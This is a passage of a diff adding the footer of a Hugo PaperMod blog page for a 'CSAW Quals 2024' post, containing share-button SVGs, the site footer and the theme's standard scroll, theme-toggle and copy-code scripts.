+                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share CSAW Quals 2024 on ycombinator"
+            href="https://news.ycombinator.com/submitlink?t=CSAW%20Quals%202024&u=http%3a%2f%2flocalhost%3a1313%2fposts%2fctf%2fcsaw-quals-2024%2f">
+            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
+                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
+                <path
+                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
+            </svg>
+        </a>
+    </li>
+</ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="http://localhost:1313/">Rezy Dev</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
